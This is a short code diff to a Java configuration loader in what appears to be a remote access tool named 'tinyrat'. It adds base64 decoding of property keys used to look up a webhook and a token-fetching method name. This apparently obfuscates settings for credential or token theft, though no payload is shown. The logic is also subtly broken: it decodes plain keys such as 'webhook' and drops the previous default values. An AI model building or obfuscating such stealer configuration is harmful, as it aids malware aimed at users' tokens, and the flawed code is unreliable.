@@ -4,6 +4,8 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.util.Properties;
 
+import com.github.tinyrat.utils.Base64Helper;
+
 public class ConfigLoader {
     private static final Properties props = new Properties();
 
@@ -19,11 +21,15 @@ public class ConfigLoader {
         }
     }
 
+    public static String getProperty(String key) {
+        return props.getProperty(Base64Helper.decode(key));
+    }
+
     public static String getWebhook() {
-        return props.getProperty("webhook", "");
+        return getProperty("webhook");
     }
 
     public static String getTokenMethodName() {
-        return props.getProperty("getTokenMethodName", "bWV0aG9kXzE2NzQ=");
+        return getProperty("getTokenMethodName");
     }
 }
